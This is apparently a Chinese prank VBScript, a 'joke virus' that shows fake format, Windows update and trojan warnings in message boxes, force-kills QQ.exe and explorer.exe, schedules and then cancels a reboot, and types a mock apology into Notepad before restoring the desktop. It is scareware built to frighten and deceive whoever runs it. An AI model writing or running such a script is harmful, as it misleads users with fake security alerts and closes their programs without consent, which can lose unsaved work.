gsh=msgbox ("已经准备好格式化，准备开始。",vbyesno)
set s=createobject("wscript.shell")
wscript.sleep 1000
msgbox "开始格式化…… 哈哈！吓晕了吧，骗你的~"
wscript.sleep 1000
wscript.sleep 1000*100
msgbox "windows发现一重要更新，将自动下载。"
wscript.sleep 3000
msgbox "系统检测到WINDOWS更新中捆绑有不明插件SXS.exe,是否对其扫描？",vbyesno
wscript.sleep 1000
msgbox "文件名 SXS.exe"+CHR(13)+"发行者 田间的菜鸟 "+chr(13)+"安全评级 高危"+chr(13)+"建议 直接删除"+chr(13)+"病毒类型：木马",,"windows扫描附件"
msgbox "是否阻止其安装？",vbyesno
wscript.sleep 3000
msgbox "阻止失败！请检查防火墙是否开启！"
wscript.sleep 5000
msgbox "正在尝试强行删除…"
wscript.sleep 5000
msgbox "失败！"
wscript.sleep 5000
msgbox "您的电脑已陷入危险之中，请赶快扫描病毒！"
wscript.sleep 10000
s.sendkeys "% n"
s.run "taskkill /im QQ.exe"
s.sendkeys "% n"
s.run "taskkill /im explorer.exe /f"
s.sendkeys "% n"
s.sendkeys "% n"
s.sendkeys "% n"
s.sendkeys "% n"
s.sendkeys "% n"
s.sendkeys "% n"
s.sendkeys "% n"
msgbox "你好啊！"
wscript.sleep 3000
msgbox "很高兴见到你！"
wscript.sleep 3000
msgbox "您的电脑可能已经感染病毒！",,"WINDOWS防火墙警告"
wscript.sleep 3000
msgbox "我控制你的电脑了！"
wscript.sleep 3000
msgbox "不信？那我给你关机看看~"
s.run "shutdown -r -t 120"
msgbox "信了吧！"
msgbox "帮你解除关机……"
s.run "shutdown -a"
msgbox "再给你打开记事本写封信，劝你最好别动，要不然会引起系统混乱~"
s.run "notepad"
wscript.sleep 3000
s.sendkeys "Hello, I'm sorry I control your computer,"
wscript.sleep 3000
s.sendkeys " but the virus is false in, "
wscript.sleep 3000
s.sendkeys "only a joke, "
wscript.sleep 3000
s.sendkeys "please rest assured! "
wscript.sleep 3000
s.sendkeys "I no longer next "
wscript.sleep 3000
s.sendkeys "time so the whole you!"
wscript.sleep 3000
s.sendkeys" Goodbye!"
s.sendkeys"{enter}"
s.sendkeys"END"
wscript.sleep 1000
s.sendkeys"%{F4}"
msgbox "提示：刚才的“病毒”是假的，只不过是吓你玩玩~"
s.run "explorer"